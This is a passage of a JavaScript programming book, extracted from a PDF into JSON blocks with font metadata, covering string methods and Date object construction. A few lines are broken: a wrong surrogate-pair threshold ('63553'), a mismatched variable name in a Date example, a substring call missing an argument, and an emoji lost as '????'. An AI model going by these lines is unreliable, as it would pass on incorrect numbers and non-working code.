        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"    this is me    \" . trimStart ();    // \"this is me    \" \"    this is me    \" . trimEnd ();    // \"    this is me\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Non-standard methods, but currently implemented by most engines",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"    this is me    \" . trimLeft ();    // \"this is me    \" \"    this is me    \" . trimRight ();    // \"    this is me\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.8: Splitting a string into an array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Use  . split  to go from strings to an array of the split substrings:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  s  =   \"one, two, three, four, five\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "s. split ( \", \" );    // [\"one\", \"two\", \"three\", \"four\", \"five\"]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Use the  array method   . join  to go back to a string:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "s. split ( \", \" ) . join ( \"--\" );    // \"one--two--three--four--five\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 42",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.9: Strings are unicode",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "All JavaScript strings are unicode!",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  s  =   \"some  \u2206\u2248\u0192  unicode  \u00a1\u2122\u00a3\u00a2\u00a2\u00a2 \" ; s. charCodeAt ( 5 );    // 8710",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "There are no raw byte or binary strings in JavaScript. To e\ufb00ectively handle binary data, use Typed Arrays.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.10: Detecting a string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To detect whether a parameter is a  primitive  string, use  typeof :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  aString  =   \"my string\" ; var  anInt  =   5 ; var  anObj  =   {}; typeof  aString  ===   \"string\" ;     // true typeof  anInt  ===   \"string\" ;       // false typeof  anObj  ===   \"string\" ;       // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you ever have a  String  object, via  new  String ( \"somestr\" ) , then the above will not work. In this instance, we can",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "use  instanceof :",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  aStringObj  =   new  String ( \"my string\" ); aStringObj  instanceof  String ;      // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To cover both instances, we can write a simple helper function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  isString  =   function ( value )   {      return   typeof  value  ===   \"string\"   ||  value  instanceof  String ; }; var  aString  =   \"Primitive String\" ; var  aStringObj  =   new  String ( \"String Object\" ); isString ( aString );   // true isString ( aStringObj );   // true isString ({});   // false isString ( 5 );   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or we can make use of  toString  function of  Object . This can be useful if we have to check for other types as well say in a switch statement, as this method supports other datatypes as well just like  typeof .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  pString  =   \"Primitive String\" ; var  oString  =   new  String ( \"Object Form of String\" ); Object. prototype . toString . call ( pString ); //\"[object String]\" Object. prototype . toString . call ( oString ); //\"[object String]\"    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A more robust solution is to not  detect  a string at all, rather only check for what functionality is required. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  aString  =   \"Primitive String\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Generic check for a substring method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if ( aString. substring )   { }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Explicit check for the String substring prototype method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 43",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( aString. substring   ===  String. prototype . substring )   {     aString. substring ( 0 ,   ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.11: Substrings with slice",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Use  . slice ()  to extract substrings given two indices:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  s  =   \"0123456789abcdefg\" ; s. slice ( 0 ,   5 );    // \"01234\" s. slice ( 5 ,   6 );    // \"5\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Given one index, it will take from that index to the end of the string:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "s. slice ( 10 );      // \"abcdefg\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.12: Character code",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The method  charCodeAt  retrieves the Unicode character code of a single character:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  charCode  =   \" \u00b5 \" . charCodeAt ();   // The character code of the letter  \u00b5  is 181",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To get the character code of a character in a string, the 0-based position of the character is passed as a parameter",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "to  charCodeAt : var  charCode  =   \"ABCDE\" . charCodeAt ( 3 );   // The character code of \"D\" is 68",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Some Unicode symbols don't \ufb01t in a single character, and instead require two UTF-16 surrogate pairs to encode. This is the case of character codes beyond 216 - 1 or 63553. These extended character codes or  code point  values can be retrieved with  codePointAt :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// The Grinning Face Emoji has code point 128512 or 0x1F600",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  codePoint  =   \"????\" . codePointAt ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.13: String Representations of Numbers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript has native conversion from  Number  to its  String representation  for any base from  2 to 36 . The most common representation after  decimal (base 10)  is  hexadecimal (base 16) , but the contents of this section work for all bases in the range. In order to convert a  Number  from decimal (base 10) to its hexadecimal (base 16)  String representation  the  toString method can be used with  radix  16 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// base 10 Number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  b10  =   12 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// base 16 String representation",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  b16  =  b10. toString ( 16 );   // \"c\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the number represented is an integer, the inverse operation for this can be done with  parseInt  and the  radix  16 again",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 44",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// base 16 String representation",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  b16  =   'c' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// base 10 Number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  b10  =  parseInt ( b16 ,   16 );   // 12",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To convert an arbitrary number (i.e. non-integer) from its  String representation  into a  Number , the operation must be split into two parts; the integer part and the fraction part.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  b16  =   '3.243f3e0370cdc' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Split into integer and fraction parts",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let   [ i16 ,  f16 ]   =  b16. split ( '.' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Calculate base 10 integer part",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  i10  =  parseInt ( i16 ,   16 );   // 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Calculate the base 10 fraction part",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  f10  =  parseInt ( f16 ,   16 )   /  Math. pow ( 16 ,  f16. length );   // 0.14158999999999988",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Put the base 10 parts together to find the Number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  b10  =  i10  +  f10 ;   // 3.14159",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note 1:  Be careful as small errors may be in the result due to di\ufb00erences in what is possible to be represented in di\ufb00erent bases. It may be desirable to perform some kind of rounding afterwards. Note 2:  Very long representations of numbers may also result in errors due to the accuracy and maximum values of  Numbers  of the environment the conversions are happening in.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.14: String Find and Replace Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To search for a string inside a string, there are several functions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "indexOf (  searchString  )  and  lastIndexOf (  searchString  )",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "indexOf ()  will return the index of the \ufb01rst occurrence of  searchString  in the string. If  searchString  is not found, then  -1  is returned.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"Hello, World!\" ; console. log (  string. indexOf ( \"o\" )   );   // 4 console. log (  string. indexOf ( \"foo\" )   );   // -1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Similarly,  lastIndexOf ()  will return the index of the last occurrence of  searchstring  or  -1  if not found.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"Hello, World!\" ; console. log (  string. lastIndexOf ( \"o\" )   );     // 8 console. log (  string. lastIndexOf ( \"foo\" )   );   // -1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "includes (  searchString ,  start  )",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "includes ()  will return a boolean that tells whether  searchString  exists in the string, starting from index  start (defaults to 0). This is better than  indexOf ()  if you simply need to test for existence of a substring.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"Hello, World!\" ; console. log (  string. includes ( \"Hello\" )   );   // true console. log (  string. includes ( \"foo\" )   );     // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 45",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "replace (  regexp | substring ,  replacement | replaceFunction  )",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "replace ()  will return a string that has all occurrences of substrings matching the  RegExp   regexp  or string substring  with a string  replacement  or the returned value of  replaceFunction . Note that this does not modify the string in place, but returns the string with replacements.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"Hello, World!\" ; string  =  string. replace (   \"Hello\" ,   \"Bye\"   ); console. log (  string  );   // \"Bye, World!\" string  =  string. replace (   /W.{3}d/g ,   \"Universe\"   ); console. log (  string  );   // \"Bye, Universe!\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "replaceFunction  can be used for conditional replacements for regular expression objects (i.e., with use with regexp ). The parameters are in the following order:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Parameter Meaning",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "match",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "the substring that matches the entire regular expressiong g1 ,  g2 ,  g3 , ... the matching groups in the regular expression",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "offset",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "the o\ufb00set of the match in the entire string",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "string",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "the entire string Note that all parameters are optional.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"heLlo, woRlD!\" ; string  =  string. replace (   /([a-zA-Z])([a-zA-Z]+)/g ,   function ( match ,  g1 ,  g2 )   {      return  g1. toUpperCase ()   +  g2. toLowerCase (); }); console. log (  string  );   // \"Hello, World!\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.15: Find the index of a substring inside a string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  . indexOf  method returns the index of a substring inside another string (if exists, or -1 if otherwise)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "'Hellow World' . indexOf ( 'Wor' );      // 7",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": ". indexOf  also accepts an additional numeric argument that indicates on what index should the function start looking",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"harr dee harr dee harr\" . indexOf ( \"dee\" ,   10 );   // 14",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You should note that  . indexOf  is case sensitive",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  'Hellow World' . indexOf ( 'WOR' );      // -1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.16: String to Upper Case",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "String.prototype.toUpperCase():",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 'qwerty' . toUpperCase ());   // 'QWERTY'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 46",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.17: String to Lower Case",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "String.prototype.toLowerCase()",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 'QWERTY' . toLowerCase ());   // 'qwerty'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.18: Repeat a String",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "This can be done using the  .repeat()  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"abc\" . repeat ( 3 );    // Returns \"abcabcabc\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"abc\" . repeat ( 0 );    // Returns \"\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"abc\" . repeat (- 1 );   // Throws a RangeError",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version < 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "In the general case, this should be done using a correct poly\ufb01ll for the ES6  String.prototype.repeat()  method. Otherwise, the idiom  new  Array ( n  +   1 ) . join ( myString )  can repeat  n  times the string  myString :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myString  =   \"abc\" ; var  n  =   3 ; new  Array ( n  +   1 ) . join ( myString );    // Returns \"abcabcabc\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 47",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 8: Date",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The number of milliseconds since 1 January 1970 00:00:00.000 UTC (Unix epoch) dateAsString  A date formatted as a string (see examples for more information) year The year value of the date. Note that  month  must also be provided, or the value will be interpreted as a number of milliseconds. Also note that values between  0  and  99  have special meaning. See the examples.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "month",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The month, in the range  0 - 11 . Note that using values outside the speci\ufb01ed range for this and the following parameters will not result in an error, but rather cause the resulting date to \"roll over\" to the next value. See the examples. day Optional: The date, in the range  1 - 31 . hour Optional: The hour, in the range  0 - 23 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "minute",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Optional: The minute, in the range  0 - 59 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "second",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Optional: The second, in the range  0 - 59 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "millisecond",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Optional: The millisecond, in the range  0 - 999 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.1: Create a new Date object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To create a new  Date  object use the  Date ()  constructor:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "with no arguments",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Date ()  creates a  Date  instance containing the current time (up to milliseconds) and date.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "with one integer argument",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Date ( m )  creates a  Date  instance containing the time and date corresponding to the Epoch time (1 January, 1970 UTC) plus  m  milliseconds. Example:  new  Date ( 749019369738 )  gives the date  Sun, 26 Sep 1993 04:56:09",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GMT .",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "with a string argument",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Date ( dateString )  returns the  Date  object that results after parsing  dateString  with  Date. parse .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "with two or more integer arguments",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Date ( i1 ,  i2 ,  i3 ,  i4 ,  i5 ,  i6 )  reads the arguments as year, month, day, hours, minutes, seconds, milliseconds and instantiates the corresponding  Date object. Note that the month is 0-indexed in JavaScript, so 0 means January and 11 means December. Example:  new  Date ( 2017 ,   5 ,   1 )  gives  June 1st, 2017 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Exploring dates",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Note that these examples were generated on a browser in the Central Time Zone of the US, during Daylight Time, as evidenced by the code. Where comparison with UTC was instructive,  Date. prototype . toISOString ()  was used",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 48",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "to show the date and time in UTC (the Z in the formatted string denotes UTC).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Creates a Date object with the current date and time from the // user's browser",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  now  =   new  Date (); now. toString ()   ===   'Mon Apr 11 2016 16:10:41 GMT-0500 (Central Daylight Time)'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true // well, at the time of this writing, anyway // Creates a Date object at the Unix Epoch (i.e., '1970-01-01T00:00:00.000Z')",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  epoch  =   new  Date ( 0 ); epoch. toISOString ()   ===   '1970-01-01T00:00:00.000Z'   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Creates a Date object with the date and time 2,012 milliseconds // after the Unix Epoch (i.e., '1970-01-01T00:00:02.012Z').",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  ms  =   new  Date ( 2012 ); date2012. toISOString ()   ===   '1970-01-01T00:00:02.012Z'   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Creates a Date object with the first day of February of the year 2012 // in the local timezone.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  one  =   new  Date ( 2012 ,   1 ); one. toString ()   ===   'Wed Feb 01 2012 00:00:00 GMT-0600 (Central Standard Time)'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true // Creates a Date object with the first day of the year 2012 in the local // timezone. // (Months are zero-based)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  zero  =   new  Date ( 2012 ,   0 ); zero. toString ()   ===   'Sun Jan 01 2012 00:00:00 GMT-0600 (Central Standard Time)'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true // Creates a Date object with the first day of the year 2012, in UTC.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  utc  =   new  Date ( Date. UTC ( 2012 ,   0 )); utc. toString ()   ===   'Sat Dec 31 2011 18:00:00 GMT-0600 (Central Standard Time)'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "utc. toISOString ()   ===   '2012-01-01T00:00:00.000Z'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true // Parses a string into a Date object (ISO 8601 format added in ECMAScript 5.1) // Implementations should assumed UTC because of ISO 8601 format and Z designation",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  iso  =   new  Date ( '2012-01-01T00:00:00.000Z' ); iso. toISOString ()   ===   '2012-01-01T00:00:00.000Z'   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Parses a string into a Date object (RFC in JavaScript 1.0)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  local  =   new  Date ( 'Sun, 01 Jan 2012 00:00:00 -0600' ); local. toString ()   ===   'Sun Jan 01 2012 00:00:00 GMT-0600 (Central Standard Time)'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true // Parses a string in no particular format, most of the time. Note that parsing // logic in these cases is very implementation-dependent, and therefore can vary // across browsers and versions.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  anything  =   new  Date ( '11/12/2012' ); anything. toString ()   ===   'Mon Nov 12 2012 00:00:00 GMT-0600 (Central Standard Time)'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true, in Chrome 49 64-bit on Windows 10 in the en-US locale. Other versions in // other locales may get a different result. // Rolls values outside of a specified range to the next value.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  rollover  =   new  Date ( 2012 ,   12 ,   32 ,   25 ,   62 ,   62 ,   1023 ); rollover. toString ()   ===   'Sat Feb 02 2013 02:03:03 GMT-0600 (Central Standard Time)'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// true; note that the month rolled over to Feb; first the month rolled over to // Jan based on the month 12 (11 being December), then again because of the day 32 // (January having 31 days).",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 49",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Special dates for years in the range 0-99",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  special1  =   new  Date ( 12 ,   0 ); special1. toString ()   ===   'Mon Jan 01 1912 00:00:00 GMT-0600 (Central Standard Time)` // true // If you actually wanted to set the year to the year 12 CE, you' d need to use the",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// setFullYear() method:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "special1. setFullYear ( 12 ); special1. toString ()   ===   'Sun Jan 01   12 00:00:00 GMT-0600 (Central Standard Time)` // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 8.2: Convert to a string format",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Convert to String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns: \"Fri Apr 15 2016 07:48:48 GMT-0400 (Eastern Daylight Time)\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Convert to Time String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toTimeString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns: \"07:48:48 GMT-0400 (Eastern Daylight Time)\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Convert to Date String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toDateString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns: \"Thu Apr 14 2016\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Convert to UTC String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toUTCString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
